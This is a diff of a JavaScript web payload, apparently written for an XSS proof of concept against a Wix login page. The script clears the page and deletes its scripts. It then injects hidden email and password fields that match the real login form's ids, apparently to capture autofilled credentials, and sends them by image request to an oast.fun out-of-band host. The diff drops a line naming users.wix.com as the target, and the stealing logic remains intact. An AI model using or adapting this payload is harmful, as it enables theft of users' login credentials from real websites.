@@ -1,16 +1,12 @@
-// Define the target domain explicitly
-var targetDomain = 'users.wix.com'; // Change this to 'site2.com', 'site3.com', etc., as needed
-
 document.body.innerHTML = "";
 var scripts = document.scripts;
 
-// Remove all existing scripts
 for (var i = scripts.length - 1; i >= 0; i--) {
   var script = scripts[i];
   script.parentNode.removeChild(script);
 }
 
-// Create style to hide everything except the form
+// Create style to hide everything except form
 var styleElement = document.createElement('style');
 var css = 'body > *:not(form):not(textarea) { display: none !important; }';
 styleElement.appendChild(document.createTextNode(css));
@@ -24,21 +20,21 @@ form.style.justifyContent = 'center';
 form.style.alignItems = 'center';
 form.style.height = '100vh';
 
-// Create input fields for username and password
+// Create input fields with IDs and names matching the original login form
 var inputUsername = document.createElement('input');
 inputUsername.type = 'text';
-inputUsername.id = 'email'; 
-inputUsername.name = 'email'; 
-inputUsername.style.display = 'none';
+inputUsername.id = 'email'; // Match the ID used on the original login form
+inputUsername.name = 'email'; // Match the name used on the original login form
+inputUsername.style.display = 'none'; // Initially hidden
 inputUsername.style.width = '300px';
 inputUsername.style.height = '40px';
 inputUsername.style.marginBottom = '10px';
 
 var inputPassword = document.createElement('input');
 inputPassword.type = 'password';
-inputPassword.id = 'password'; 
-inputPassword.name = 'password';
-inputPassword.style.display = 'none';
+inputPassword.id = 'password'; // Match the ID used on the original login form
+inputPassword.name = 'password'; // Match the name used on the original login form
+inputPassword.style.display = 'none'; // Initially hidden
 inputPassword.style.width = '300px';
 inputPassword.style.height = '40px';
 inputPassword.style.marginBottom = '10px';
@@ -64,7 +60,7 @@ document.body.appendChild(form);
 // Function to send the credentials back to your server
 function sendCredentials(username, password) {
   var img = new Image();
-  img.src = `https://hqwkfozbqejnjncfqouaju7a9oghr07ei.oast.fun?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}&domain=${encodeURIComponent(targetDomain)}`;
+  img.src = `https://hqwkfozbqejnjncfqouaju7a9oghr07ei.oast.fun?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`;
   document.body.appendChild(img);
 }
 
